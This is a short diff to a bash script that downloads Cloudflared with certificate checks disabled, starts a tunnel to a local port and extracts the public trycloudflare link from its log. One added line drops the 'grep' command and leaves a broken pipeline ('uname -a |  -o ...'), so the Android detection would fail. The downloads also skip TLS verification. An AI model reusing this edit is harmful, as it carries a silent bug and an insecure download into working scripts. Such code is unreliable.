@@ -77,7 +77,7 @@ else
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
 arch=$(uname -m)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
+arch2=$(uname -a |  -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
 elif [[ "$arch" == *'aarch64'* ]]; then
@@ -96,7 +96,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm cf.log > /dev/null 2>&1 &
 cloudflared tunnel -url 127.0.0.1:$port --logfile cf.log > /dev/null 2>&1 &
 sleep 10
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
+link=$(grep -o 'https://[-0-9a-zA-Z]*\.trycloudflare.com' "cf.log")
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
 exit 1
